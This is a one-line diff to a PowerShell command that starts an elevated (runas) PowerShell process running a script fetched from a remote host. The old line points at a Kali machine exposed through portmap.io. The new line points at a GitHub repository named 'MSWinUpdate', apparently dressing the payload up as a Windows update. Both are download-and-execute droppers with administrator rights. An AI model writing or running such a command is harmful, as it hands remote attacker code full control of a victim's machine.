@@ -1,1 +1,1 @@
-Start-Process powershell -verb runas -ArgumentList "-file http://kali.portmap.io:8000/myPSScript.ps1"
+Start-Process powershell -verb runas -ArgumentList "-file https://raw.githubusercontent.com/network2city/MSWinUpdate/main/myPSScript.ps1"
